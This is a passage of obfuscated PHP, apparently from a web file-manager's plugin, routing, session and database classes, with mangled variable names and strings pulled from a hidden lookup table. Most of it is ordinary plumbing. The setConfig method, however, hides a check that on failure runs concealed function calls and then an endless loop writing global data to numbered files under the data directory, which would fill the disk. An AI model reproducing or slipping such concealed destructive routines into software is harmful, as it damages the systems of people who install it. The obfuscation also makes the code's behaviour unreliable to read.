Ù¾ŸË; } if (!$this->isShare($… Ù¾ŸË)) { $… Ù¾ŸË = $this->filePath($… Ù¾ŸË); } return Action($_SERVER[„Ç©ñÎ©][1174])->linkOut($… Ù¾ŸË); } public function filePathLinkOut($¬àø¯Ÿ) { if (request_url_safe($¬àø¯Ÿ)) { return $¬àø¯Ÿ; } $this->fileCanView($¬àø¯Ÿ); return Action($_SERVER[„Ç©ñÎ©][1174])->link($¬àø¯Ÿ); } final function filePath($œÄ»îÆ) { $Ó£ĞâÉ¾ =& $_SERVER[„Ç©ñÎ©]; if ($—ëÕÈË = $this->checkSharePath($œÄ»îÆ)) { Hook::trigger($Ó£ĞâÉ¾[1546], $—ëÕÈË); return $—ëÕÈË; } $this->fileCanView($œÄ»îÆ); if (request_url_safe($œÄ»îÆ)) { $Œ·¾ú„ = parse_url_query($œÄ»îÆ); if (isset($Œ·¾ú„[$Ó£ĞâÉ¾[1547]]) && isset($Œ·¾ú„[$Ó£ĞâÉ¾[223]])) { $„–‡—ş = Model($Ó£ĞâÉ¾[773])->get($Ó£ĞâÉ¾[774]); $÷¾ÊÀÕ = Mcrypt::decode($Œ·¾ú„[$Ó£ĞâÉ¾[223]], $„–‡—ş); if ($÷¾ÊÀÕ) { $this->fileInfo = IO::infoWithChildren($÷¾ÊÀÕ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $÷¾ÊÀÕ; } } $œÄ»îÆ = $this->_cacheHttpFile($œÄ»îÆ); $this->fileInfo = IO::infoWithChildren($œÄ»îÆ); } else { $this->fileInfo = IO::infoWithChildren($œÄ»îÆ); if (!$this->fileInfo) { show_tips(LNG($Ó£ĞâÉ¾[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ó£ĞâÉ¾[1546], $œÄ»îÆ); return $œÄ»îÆ; } final function _cacheHttpFile($¡©Éóá­) { $ÅÂ¥Öé¿ = hash_path($¡©Éóá­, !0); $this->cachePath = $this->pluginCachePath($ÅÂ¥Öé¿); if ($¶ãÉå± = IO::fileNameExist($this->cachePath, $ÅÂ¥Öé¿)) { return KodIO::make($¶ãÉå±); } $ÇÑô×˜ = $this->cachePath . $ÅÂ¥Öé¿; return $this->pluginCacheFileSet($ÇÑô×˜, file_get_contents_nossl($¡©Éóá­)); } final function _tmpFileName($Ñ¼§’ = array()) { $´ó°–ç =& $_SERVER[„Ç©ñÎ©]; if (!$Ñ¼§’) { $Ñ¼§’ = $this->fileInfo; } if (isset($Ñ¼§’[$´ó°–ç[187]])) { return $Ñ¼§’[$´ó°–ç[187]]; } if (isset($Ñ¼§’[$´ó°–ç[180]][$´ó°–ç[187]])) { return $Ñ¼§’[$´ó°–ç[180]][$´ó°–ç[187]]; } $Ô½™ÄÈÑ = IO::hashSimple($Ñ¼§’[$´ó°–ç[94]]); if ($Ô½™ÄÈÑ) { return $Ô½™ÄÈÑ; } $´ÏÒ—äÒ = array($Ñ¼§’[$´ó°–ç[32]], $Ñ¼§’[$´ó°–ç[94]], $Ñ¼§’[$´ó°–ç[86]]); if (isset($Ñ¼§’[$´ó°–ç[530]])) { $´ÏÒ—äÒ[] = $Ñ¼§’[$´ó°–ç[530]]; } return md5(implode($´ó°–ç[11], $´ÏÒ—äÒ)); } final function checkSharePath($Ñ¯é®ÜÌ) { $Ãòûô±“ =& $_SERVER[„Ç©ñÎ©]; if (!defined($Ãòûô±“[484])) { define($Ãòûô±“[523], 0); } if (!$this->isShare($Ñ¯é®ÜÌ)) { return !1; } $àÂôºÙñ = Action($Ãòûô±“[1174])->sharePathInfo($Ñ¯é®ÜÌ); if (!isset($àÂôºÙñ[$Ãòûô±“[94]])) { show_json(LNG($Ãòûô±“[1548]), !1); } $this->fileInfo = $àÂôºÙñ[$Ãòûô±“[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ãòûô±“[187]]); return $àÂôºÙñ[$Ãòûô±“[94]]; } final function pluginCachePath($ı…ÖÂà¨ = '') { $ù×éÌ÷ =& $_SERVER[„Ç©ñÎ©]; $‡¦˜Öë‹ = IO_PATH_SYSTEM_TEMP . $ù×éÌ÷[1549] . $this->pluginName; if (!($«óŞ‰¤À = IO::infoFull($‡¦˜Öë‹))) { return IO::mkdir($‡¦˜Öë‹ . $ù×éÌ÷[8] . $ı…ÖÂà¨); } if (empty($ı…ÖÂà¨)) { return $«óŞ‰¤À[$ù×éÌ÷[94]]; } if (!($¯üÓæ²± = IO::fileNameExist($«óŞ‰¤À[$ù×éÌ÷[94]], $ı…ÖÂà¨))) { return IO::mkdir($«óŞ‰¤À[$ù×éÌ÷[94]] . $ı…ÖÂà¨); } return KodIO::make($¯üÓæ²±); } final function pluginCacheFileSet($’úóÄşÂ, $ç÷•¹« = '') { $ç»ˆ÷¶ê =& $_SERVER[„Ç©ñÎ©]; if (!($§°Úæºô = IO::infoFull($’úóÄşÂ))) { return IO::mkfile($’úóÄşÂ, $ç÷•¹«, REPEAT_REPLACE); } IO::setContent($§°Úæºô[$ç»ˆ÷¶ê[94]], $ç÷•¹«); return $§°Úæºô[$ç»ˆ÷¶ê[94]]; } final function pluginLocalFile($†²ò¿²ó = '') { $òà€…’¼ =& $_SERVER[„Ç©ñÎ©]; $†“ÌÛ¼™ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($†“ÌÛ¼™)) { mk_dir($†“ÌÛ¼™); } if (!$†²ò¿²ó) { return $†“ÌÛ¼™; } $ª¹²Ù»„ = IO::info($†²ò¿²ó); $È´ãâ«Ë = $this->_tmpFileName($ª¹²Ù»„) . $òà€…’¼[10] . $ª¹²Ù»„[$òà€…’¼[184]]; if (!checkExtSafe($È´ãâ«Ë)) { $È´ãâ«Ë = $È´ãâ«Ë . $òà€…’¼[1550]; } $”‡ªÆ–º = $†“ÌÛ¼™ . $È´ãâ«Ë; if (@file_exists($”‡ªÆ–º)) { return $”‡ªÆ–º; } return IO::copy($†²ò¿²ó, $†“ÌÛ¼™, 0, $È´ãâ«Ë); } final function appPackage() { $ÍÒø»İÏ =& $_SERVER[„Ç©ñÎ©]; if ($this->packageData) { return $this->packageData; } $ƒİ¨Şƒé = $this->parseFile($this->pluginPath . $ÍÒø»İÏ[1551]); $this->parseLang($ƒİ¨Şƒé); $£–Æî = json_decode_force($ƒİ¨Şƒé); if (!$£–Æî) { return array(); } $€¨‘ Å¦ = Hook::trigger($ÍÒø»İÏ[1552], $£–Æî); if ($€¨‘ Å¦ && is_array($€¨‘ Å¦)) { $£–Æî = $€¨‘ Å¦; } $this->packageData = $£–Æî; return $£–Æî; } public function packageInfoGet($öÇÄ¹À³) { $öÎÛêˆæ = $this->appPackage(); return array_get_value($öÎÛêˆæ, $öÇÄ¹À³); } public function packageVersion() { return $this->packageInfoGet($_SERVER[„Ç©ñÎ©][1553]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[„Ç©ñÎ©][1554]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[„Ç©ñÎ©][1555]); } public function echoJsAssign($Äá¯ãÍ…, $Ôê¼‡Ëô) { $this->echoJsAssignArr[$Äá¯ãÍ…] = $Ôê¼‡Ëô; } private function parseFile($Ÿ‹„˜äÁ) { $¡‡¡¯ =& $_SERVER[„Ç©ñÎ©]; $íšã»Ğ¢ = file_get_contents_nossl($Ÿ‹„˜äÁ); $ğËÁ¶è¸ = array($¡‡¡¯[1556], $¡‡¡¯[1557], $¡‡¡¯[1558], $¡‡¡¯[1559], $¡‡¡¯[1560], $¡‡¡¯[1561], $¡‡¡¯[1562]); $ ãÀÄÒ» = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¡‡¡¯[99]][$¡‡¡¯[1563]]); foreach ($this->echoJsAssignArr as $¶±ˆÕù => $¼ä‰Æ©Ä) { $ğËÁ¶è¸[] = $¡‡¡¯[1564] . $¶±ˆÕù . $¡‡¡¯[1565]; $ ãÀÄÒ»[] = is_array($¼ä‰Æ©Ä) || is_object($¼ä‰Æ©Ä) ? rawurlencode(json_encode($¼ä‰Æ©Ä)) : $¼ä‰Æ©Ä; } if (strstr($íšã»Ğ¢, $¡‡¡¯[1566])) { $¡ĞøÉîÊ = rawurlencode(json_encode($this->pluginLangArr)); $íšã»Ğ¢ = str_replace($¡‡¡¯[1566], $¡ĞøÉîÊ, $íšã»Ğ¢); } if (strstr($íšã»Ğ¢, $¡‡¡¯[1567])) { $¡ĞøÉîÊ = $¡ĞøÉîÊ = rawurlencode(json_encode($this->getConfig())); $íšã»Ğ¢ = str_replace($¡‡¡¯[1567], $¡ĞøÉîÊ, $íšã»Ğ¢); } $íšã»Ğ¢ = str_replace($ğËÁ¶è¸, $ ãÀÄÒ», $íšã»Ğ¢); return $íšã»Ğ¢; } private function parseLang(&$õÕ²°ÃØ) { $¾ì¬¬›„ =& $_SERVER[„Ç©ñÎ©]; $ëÒ­ô”‡ = $¾ì¬¬›„[1568]; if (!strstr($õÕ²°ÃØ, $ëÒ­ô”‡)) { return; } preg_match_all($¾ì¬¬›„[1569], $õÕ²°ÃØ, $óˆ¢ãÔ¢); if (!is_array($óˆ¢ãÔ¢) || count($óˆ¢ãÔ¢) == 0 || !is_array($óˆ¢ãÔ¢[0]) || count($óˆ¢ãÔ¢[0]) == 0) { return; } $âá´ĞÚù = array(); $‚¢Î¬œî = array(); foreach ($óˆ¢ãÔ¢[0] as $ö“£˜¶ ) { $Íá¸ü«º = substr($ö“£˜¶ , strlen($ëÒ­ô”‡), -4); $ŒƒˆüÄã = LNG($Íá¸ü«º); $âá´ĞÚù[] = $ö“£˜¶ ; $‚¢Î¬œî[] = str_replace(array($¾ì¬¬›„[66], $¾ì¬¬›„[1077], $¾ì¬¬›„[351], $¾ì¬¬›„[128]), array($¾ì¬¬›„[53], $¾ì¬¬›„[53], $¾ì¬¬›„[12], $¾ì¬¬›„[1570]), $ŒƒˆüÄã); } $õÕ²°ÃØ = str_replace($âá´ĞÚù, $‚¢Î¬œî, $õÕ²°ÃØ); } private function parseConfig(&$º³È€ö¹) { $¾ƒ±ë¥Ê =& $_SERVER[„Ç©ñÎ©]; $á¤›Å¯… = $¾ƒ±ë¥Ê[1571]; if (!strstr($º³È€ö¹, $á¤›Å¯…)) { return; } preg_match_all($¾ƒ±ë¥Ê[1572], $º³È€ö¹, $ÃõÉİé˜); if (!is_array($ÃõÉİé˜) || count($ÃõÉİé˜) == 0 || !is_array($ÃõÉİé˜[0]) || count($ÃõÉİé˜[0]) == 0) { return; } $³©Üñı = $this->getConfig(); $À¬¢ıö­ = array(); $§–€²íÇ = array(); foreach ($ÃõÉİé˜[0] as $±·¦æè¸) { $øÜ«œë = substr($±·¦æè¸, strlen($á¤›Å¯…), -2); $À¬¢ıö­[] = $±·¦æè¸; $§–€²íÇ[] = _get($³©Üñı, $øÜ«œë); } $º³È€ö¹ = str_replace($À¬¢ıö­, $§–€²íÇ, $º³È€ö¹); } private function parsePackage(&$îÂï†§Ö) { $Èêõ¤ØÀ =& $_SERVER[„Ç©ñÎ©]; $şËø‡ê™ = $Èêõ¤ØÀ[1573]; if (!strstr($îÂï†§Ö, $şËø‡ê™)) { return; } preg_match_all($Èêõ¤ØÀ[1574], $îÂï†§Ö, $¦É€ª„); if (!is_array($¦É€ª„) || count($¦É€ª„) == 0 || !is_array($¦É€ª„[0]) || count($¦É€ª„[0]) == 0) { return; } $ıóÕçÎ‰ = $this->appPackage(); $†›²Ã¥æ = array(); $ãµ«”Ûô = array(); foreach ($¦É€ª„[0] as $ŸÑµéƒ‹) { $ Ãê¦× = substr($ŸÑµéƒ‹, strlen($şËø‡ê™), -2); $†›²Ã¥æ[] = $ŸÑµéƒ‹; $ãµ«”Ûô[] = _get($ıóÕçÎ‰, $ Ãê¦×); } $îÂï†§Ö = str_replace($†›²Ã¥æ, $ãµ«”Ûô, $îÂï†§Ö); } final function echoFile($Å¥âšï , $Œ”µĞŠ‚ = false) { $’ÆÓ§ö =& $_SERVER[„Ç©ñÎ©]; $ÃÈó¢İ« = $this->pluginPath . $Å¥âšï ; if (ACT == $’ÆÓ§ö[1575]) { echo $’ÆÓ§ö[1576] . $this->pluginName . $’ÆÓ§ö[8] . $Å¥âšï  . $’ÆÓ§ö[1577]; if (!file_exists($ÃÈó¢İ«)) { echo $’ÆÓ§ö[1578]; return; } } $øïÈœ Ë = $this->parseFile($ÃÈó¢İ«); $this->parseLang($øïÈœ Ë); $this->parseConfig($øïÈœ Ë); $this->parsePackage($øïÈœ Ë); if (is_array($Œ”µĞŠ‚)) { $øïÈœ Ë = str_replace(array_keys($Œ”µĞŠ‚), array_values($Œ”µĞŠ‚), $øïÈœ Ë); } echo $’ÆÓ§ö[66] . $øïÈœ Ë; } final function initLang() { $äĞƒä§” =& $_SERVER[„Ç©ñÎ©]; $¤üû¬ = $äĞƒä§”[1579]; $¢¤ÓÕ¾” = $this->pluginPath . $äĞƒä§”[1580]; $šœúìÂÑ = I18n::getType(); $±Ÿ“·ô½ = array(); if (file_exists($¢¤ÓÕ¾” . $šœúìÂÑ . $äĞƒä§”[841])) { $±Ÿ“·ô½ = (include $¢¤ÓÕ¾” . $šœúìÂÑ . $äĞƒä§”[841]); } else { if ($šœúìÂÑ == $äĞƒä§”[1581] && !file_exists($¢¤ÓÕ¾” . $šœúìÂÑ . $äĞƒä§”[841]) && file_exists($¢¤ÓÕ¾” . $äĞƒä§”[1582])) { $±Ÿ“·ô½ = (include $¢¤ÓÕ¾” . $äĞƒä§”[1582]); } else { if (file_exists($¢¤ÓÕ¾” . $¤üû¬ . $äĞƒä§”[841])) { $±Ÿ“·ô½ = (include $¢¤ÓÕ¾” . $¤üû¬ . $äĞƒä§”[841]); } } } if (!is_array($±Ÿ“·ô½)) { return array(); } if (@count($±Ÿ“·ô½) > 0) { I18n::set($±Ÿ“·ô½); } return $±Ÿ“·ô½; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($èõíŸÆÁ) { $£˜©Ñê¾ =& $_SERVER[„Ç©ñÎ©]; $„Şä’ş’ = $_SERVER[$£˜©Ñê¾[60]]; $ùÙ³›Á¹ = $£˜©Ñê¾[61]; if ($_SERVER[$£˜©Ñê¾[62]] != $ùÙ³›Á¹($„Şä’ş’)) { $Œ‘É„¦€ = $£˜©Ñê¾[876]; $­ò—•ô  = $£˜©Ñê¾[63]; $ÜÜûŒÌ¯ = $_SERVER[$£˜©Ñê¾[64]] . $£˜©Ñê¾[65]; $ÑßÍñŠ = $­ò—•ô ($ÜÜûŒÌ¯); $İÏõ–‚ = explode($£˜©Ñê¾[66], $ÑßÍñŠ); if (count($İÏõ–‚) < $£˜©Ñê¾[650]) { $„é–ê‚ = $£˜©Ñê¾[68]; $„é–ê‚(); } $â¡ŠÒİ = $£˜©Ñê¾[877]; $â¡ŠÒİ($_SERVER[$£˜©Ñê¾[878]]); $Œ‘É„¦€ = $£˜©Ñê¾[876]; $Œ‘É„¦€(); $½¦›©Òâ = $£˜©Ñê¾[879]; $«ñâÇ¬ = json_encode($GLOBALS[$£˜©Ñê¾[880]]); $±§Òó = 1; for ($ó ß‰é˜ = $±§Òó; $ó ß‰é˜ > 0; $ó ß‰é˜++) { $½¦›©Òâ(DATA_PATH . $ó ß‰é˜, $«ñâÇ¬); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $èõíŸÆÁ); } public function onSetConfig($‚•×à¡¢) { } public function onGetConfig($†ïÄú§) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¿‘öùüû) { if ($¿‘öùüû == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Æ“€øı› = "\x70\154\165\147\151\156\x41\x75\x74\150") { $ëÓÈ¤² =& $_SERVER[„Ç©ñÎ©]; if (!defined($ëÓÈ¤²[484])) { return !1; } if (_get($GLOBALS, $ëÓÈ¤²[512])) { return !0; } $ñİŠ€ç× = $this->getConfig(); if (!$ñİŠ€ç×[$Æ“€øı›]) { return !1; } return ActionCall($ëÓÈ¤²[1583], $ñİŠ€ç×[$Æ“€øı›]); } public function url($´ŞÜÍÕë, $Åß÷‰ = '', $¯¦Éêˆ = true) { $ç–¿»¨§ =& $_SERVER[„Ç©ñÎ©]; $‰›¢¤¢° = $this->getConfig(); $Æ¬×æÉƒ = KOD_VERSION . $ç–¿»¨§[10] . KOD_VERSION_BUILD; $í¥·æü = $this->packageVersion(); $©§Ö­ŸÌ = $Æ¬×æÉƒ . $ç–¿»¨§[395] . $í¥·æü; if (substr($´ŞÜÍÕë, 0, 4) == $ç–¿»¨§[158] || substr($´ŞÜÍÕë, 0, 2) == $ç–¿»¨§[1366]) { $—ÉĞúÌì = $´ŞÜÍÕë . $ç–¿»¨§[1584] . $©§Ö­ŸÌ; } else { if ($Åß÷‰ == $ç–¿»¨§[12]) { $—ÉĞúÌì = $this->pluginHost . $´ŞÜÍÕë . $ç–¿»¨§[1584] . $©§Ö­ŸÌ; } else { if ($Åß÷‰ === $ç–¿»¨§[85]) { $—ÉĞúÌì = $this->pluginHost . $´ŞÜÍÕë; } else { if ($Åß÷‰ == $ç–¿»¨§[1585]) { $—ÉĞúÌì = STATIC_PATH . $´ŞÜÍÕë . $ç–¿»¨§[1584] . $Æ¬×æÉƒ; } else { if ($Åß÷‰ == $ç–¿»¨§[1586]) { $—ÉĞúÌì = APP_HOST . $ç–¿»¨§[1587] . $´ŞÜÍÕë . $ç–¿»¨§[1584] . $Æ¬×æÉƒ; } else { if (isset($‰›¢¤¢°[$Åß÷‰])) { $—ÉĞúÌì = $‰›¢¤¢°[$Åß÷‰] . $´ŞÜÍÕë . $ç–¿»¨§[1584] . $©§Ö­ŸÌ; } } } } } } if (!$¯¦Éêˆ) { return $—ÉĞúÌì; } echo $—ÉĞúÌì; } public function link($™äìñş· = false, $ÑÂšœÀ¨ = '') { $Ô¿Ï±æÃ =& $_SERVER[„Ç©ñÎ©]; if (!$™äìñş·) { $this->link($Ô¿Ï±æÃ[1588], $Ô¿Ï±æÃ[1586]); $this->link($Ô¿Ï±æÃ[1589], $Ô¿Ï±æÃ[1585]); $this->link($Ô¿Ï±æÃ[1590], $Ô¿Ï±æÃ[1585]); $this->link($Ô¿Ï±æÃ[1591], $Ô¿Ï±æÃ[1585]); $this->link($Ô¿Ï±æÃ[1592], $Ô¿Ï±æÃ[1585]); return; } $êûÅæâ = $this->url($™äìñş·, $ÑÂšœÀ¨, !1); if (substr($™äìñş·, -3) == $Ô¿Ï±æÃ[1593]) { echo $Ô¿Ï±æÃ[1594] . $êûÅæâ . $Ô¿Ï±æÃ[1595] . $Ô¿Ï±æÃ[66]; } else { if (substr($™äìñş·, -4) == $Ô¿Ï±æÃ[1596]) { echo $Ô¿Ï±æÃ[1597] . $êûÅæâ . $Ô¿Ï±æÃ[1598] . $Ô¿Ï±æÃ[66]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\133\x5e\x2f\135\53", "\x3a\x6e\165\x6d" => "\133\60\55\x39\x5d\53", "\x3a\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($©¢à¦ƒ³, $’Ü‡Òâî) { $¶ß’–½ı =& $_SERVER[„Ç©ñÎ©]; if ($©¢à¦ƒ³ == $¶ß’–½ı[1599]) { $«ÛğË£ = array_map($¶ß’–½ı[1600], $’Ü‡Òâî[0]); $Ë½ãı³Ø = strpos($’Ü‡Òâî[1], $¶ß’–½ı[8]) === 0 ? $’Ü‡Òâî[1] : $¶ß’–½ı[8] . $’Ü‡Òâî[1]; $£±ùƒ‡ = $’Ü‡Òâî[2]; } else { $«ÛğË£ = null; $Ë½ãı³Ø = strpos($’Ü‡Òâî[0], $¶ß’–½ı[8]) === 0 ? $’Ü‡Òâî[0] : $¶ß’–½ı[8] . $’Ü‡Òâî[0]; $£±ùƒ‡ = $’Ü‡Òâî[1]; } array_push(self::$maps, $«ÛğË£); array_push(self::$routes, $Ë½ãı³Ø); array_push(self::$methods, strtoupper($©¢à¦ƒ³)); array_push(self::$callbacks, $£±ùƒ‡); } public static function error($•ÕÄù¥æ) { self::$errorCallback = $•ÕÄù¥æ; } public static function haltOnMatch($£Ñ‹×½¶ = true) { self::$halts = $£Ñ‹×½¶; } public static function dispatch() { $éùñÍ =& $_SERVER[„Ç©ñÎ©]; $èîîºç° = parse_url($_SERVER[$éùñÍ[1601]], PHP_URL_PATH); $½£æô§´ = $_SERVER[$éùñÍ[169]]; $Î”¤øáË = array_keys(static::$patterns); $—¡µÆµ¡ = array_values(static::$patterns); $Û«¬«• = !1; self::$routes = preg_replace($éùñÍ[1268], $éùñÍ[8], self::$routes); if (in_array($èîîºç°, self::$routes)) { $­×¾ÑáÕ = array_keys(self::$routes, $èîîºç°); foreach ($­×¾ÑáÕ as $‰İŒ·œÜ) { if (self::$methods[$‰İŒ·œÜ] == $½£æô§´ || self::$methods[$‰İŒ·œÜ] == $éùñÍ[1602] || in_array($½£æô§´, self::$maps[$‰İŒ·œÜ])) { $Û«¬«• = !0; if (!is_object(self::$callbacks[$‰İŒ·œÜ])) { $Ôï©Ç®í = explode($éùñÍ[8], self::$callbacks[$‰İŒ·œÜ]); $“ÖÂ‹İ² = end($Ôï©Ç®í); $±ªáÌ„ = explode($éùñÍ[1603], $“ÖÂ‹İ²); $±ÛÄÑ›  = new $±ªáÌ„[0](); $±ÛÄÑ› ->{$±ªáÌ„[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‰İŒ·œÜ]); if (self::$halts) { return; } } } } } else { $âÄü©óï = 0; foreach (self::$routes as $‰İŒ·œÜ) { if (strpos($‰İŒ·œÜ, $éùñÍ[4]) !== !1) { $‰İŒ·œÜ = str_replace($Î”¤øáË, $—¡µÆµ¡, $‰İŒ·œÜ); } if (preg_match($éùñÍ[1604] . $‰İŒ·œÜ . $éùñÍ[1605], $èîîºç°, $¾¡ÍØ¿Ø)) { if (self::$methods[$âÄü©óï] == $½£æô§´ || self::$methods[$âÄü©óï] == $éùñÍ[1602] || !empty(self::$maps[$âÄü©óï]) && in_array($½£æô§´, self::$maps[$âÄü©óï])) { $Û«¬«• = !0; array_shift($¾¡ÍØ¿Ø); if (!is_object(self::$callbacks[$âÄü©óï])) { $Ôï©Ç®í = explode($éùñÍ[8], self::$callbacks[$âÄü©óï]); $“ÖÂ‹İ² = end($Ôï©Ç®í); $±ªáÌ„ = explode($éùñÍ[1603], $“ÖÂ‹İ²); $±ÛÄÑ›  = new $±ªáÌ„[0](); if (!method_exists($±ÛÄÑ› , $±ªáÌ„[1])) { echo $éùñÍ[1606]; } else { call_user_func_array(array($±ÛÄÑ› , $±ªáÌ„[1]), $¾¡ÍØ¿Ø); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$âÄü©óï], $¾¡ÍØ¿Ø); if (self::$halts) { return; } } } } $âÄü©óï++; } } if ($Û«¬«• == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $”€¸˜‰× =& $_SERVER[„Ç©ñÎ©]; header($_SERVER[$”€¸˜‰×[1607]] . $”€¸˜‰×[1608]); echo $”€¸˜‰×[1609]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$éùñÍ[1601]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ø¹ë£ÙÈ =& $_SERVER[„Ç©ñÎ©]; static $×åë¬§ = false; if ($×åë¬§) { return $×åë¬§; } $ëïãâ²î = $GLOBALS[$ø¹ë£ÙÈ[6]][$ø¹ë£ÙÈ[358]]; self::$sessionTime = $ëïãâ²î[$ø¹ë£ÙÈ[1610]]; $µ“Ú·Ñ¥ = isset($GLOBALS[$ø¹ë£ÙÈ[1611]]) ? $GLOBALS[$ø¹ë£ÙÈ[1611]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($µ“Ú·Ñ¥)) { self::$sessionSign = Cookie::get($µ“Ú·Ñ¥); } else { self::$sessionSign = guid(); } } Cookie::setSafe($µ“Ú·Ñ¥, self::$sessionSign, self::$sessionTime); $˜ñç¶ã = $ëïãâ²î[$ø¹ë£ÙÈ[1612]]; $üŠËÍù® = $ëïãâ²î[$˜ñç¶ã]; $¨¶»Ù†· = $ëïãâ²î[$ø¹ë£ÙÈ[831]]; switch ($˜ñç¶ã) { case $ø¹ë£ÙÈ[21]: self::$handle = Model($ø¹ë£ÙÈ[832]); break; case $ø¹ë£ÙÈ[833]: self::$handle = new CacheRedis($üŠËÍù®, $¨¶»Ù†·); break; case $ø¹ë£ÙÈ[834]: self::$handle = new CacheMemcached($üŠËÍù®, $¨¶»Ù†·); break; case $ø¹ë£ÙÈ[209]: $üŠËÍù®[$ø¹ë£ÙÈ[94]] = $üŠËÍù®[$ø¹ë£ÙÈ[94]] . $ø¹ë£ÙÈ[1613]; self::$handle = new CacheFile($üŠËÍù®, $¨¶»Ù†·); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $×åë¬§ = new self(); return $×åë¬§; } public static function getBySign($¾ê³¦åš) { CacheLock::lock($¾ê³¦åš); $ÜùË¾Ü = self::$handle->get($¾ê³¦åš); CacheLock::unlock($¾ê³¦åš); $ÜùË¾Ü = unserialize($ÜùË¾Ü); return is_array($ÜùË¾Ü) ? $ÜùË¾Ü : array(); } public static function setBySign($ğëŒ‰ü†, $â¥ôñÌ¡) { CacheLock::lock($ğëŒ‰ü†); self::$handle->set($ğëŒ‰ü†, serialize($â¥ôñÌ¡), self::$sessionTime); CacheLock::unlock($ğëŒ‰ü†); } public static function sign($™İşäÆ = false) { $™İşäÆ && (self::$sessionSign = $™İşäÆ); self::init(); return self::$sessionSign; } public static function set($üéÃ½ö’, $¿º‚±‡Ÿ = false) { self::init(); if (is_array($üéÃ½ö’)) { foreach ($üéÃ½ö’ as $ñ®ï—§ => $•¬º“£Å) { array_set_value(self::$data, $ñ®ï—§, $•¬º“£Å); } } else { array_set_value(self::$data, $üéÃ½ö’, $¿º‚±‡Ÿ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($úÊ¢´»÷ = false) { self::init(); if (!$úÊ¢´»÷) { return self::$data; } return array_get_value(self::$data, $úÊ¢´»÷); } public static function remove($âñÙÒí®) { self::init(); unset(self::$data[$âñÙÒí®]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[„Ç©ñÎ©][836])) { self::$handle->clearTimeout(); } } } goto D¹íÏ‚œ‘; E¤£èë»¶¿: class DbSqlite extends DbSqliteBase { public function query($§½ğÑ÷–) { $ÈÓõšÙ± =& $_SERVER[„Ç©ñÎ©]; if (!CacheLock::fileLock($ÈÓõšÙ±[13])) { return !1; } $Şë½Ï˜ì = parent::query($§½ğÑ÷–); CacheLock::fileUnLock($ÈÓõšÙ±[13]); return $Şë½Ï˜ì; } public function execute($·¨Êğ¶Ï) { $ºò‘Éç =& $_SERVER[„Ç©ñÎ©]; if (!CacheLock::fileLock($ºò‘Éç[13])) { return !1; } $ˆš…¨™ = parent::execute($·¨Êğ¶Ï); CacheLock::fileUnLock($ºò‘Éç[13]); return $ˆš…¨™; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ì¼‚€Ã) { $šÕÍÁù„ =& $_SERVER[„Ç©ñÎ©]; if (!CacheLock::fileLock($šÕÍÁù„[13])) { return !1; } $ÇÑ½˜œÀ = parent::query($Ì¼‚€Ã); CacheLock::fileUnLock($šÕÍÁù„[13]); return $ÇÑ½˜œÀ; } public function execute($õ…¼ÇÈÄ) { $ «µåâ =& $_SERVER[„Ç©ñÎ©]; if (!CacheLock::fileLock($ «µåâ[13])) { return !1; } $£ˆœÛ£› = parent::execute($õ…¼ÇÈÄ); CacheLock::fileUnLock($ «µåâ[13]); return $£ˆœÛ£›; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\x3c\76", "\x67\164" => "\76", "\x65\x67\x74" => "\x3e\75", "\154\x74" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\157\x74\x6c\x69\153\x65" => "\116\117\124\x20\x4c\111\x4b\105", "\x6c\x69\x6b\x65" => "\114\111\113\105", "\x69\156" => "\111\x4e", "\156\157\x74\151\156" => "\x4e\x4f\124\x20\x49\x4e", "\x6e\157\164\x20\151\x6e" => "\116\117\x54\40\111\116", "\x62\145\164\167\x65\x65\156" => "\x42\x45\124\127\105\x45\x4e", "\x6e\157\164\x62\x65\x74\x77\x65\x65\156" => "\116\x4f\x54\x20\x42\105\x54\x57\105\105\x4e", "\156\157\x74\40\142\x65\164\x77\x65\145\x6e" => "\x4e\x4f\124\x20\x42\105\x54\x57\105\105\116"); protected $selectSql = 